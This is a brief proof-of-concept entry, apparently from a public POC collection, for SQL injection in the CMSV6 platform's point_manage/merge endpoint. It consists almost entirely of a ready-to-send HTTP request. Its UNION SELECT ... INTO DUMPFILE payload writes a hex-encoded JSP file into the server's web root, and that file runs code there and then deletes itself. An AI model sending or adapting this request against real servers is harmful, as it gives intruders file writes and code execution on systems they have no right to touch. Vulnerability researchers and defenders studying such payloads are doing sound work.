# CMSV6_pointManage_sqli

from: https://github.com/wy876/POC/blob/main/%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E6%8E%A5%E5%8F%A3pointManage%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md

```
POST /point_manage/merge HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2882.93 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Host: ip

id=1&name=1' UNION SELECT%0aNULL, 0x3c25206f75742e7072696e7428227a7a3031306622293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL
INTO dumpfile '../../tomcat/webapps/gpsweb/allgods.jsp' FROM user_session a
WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8
```
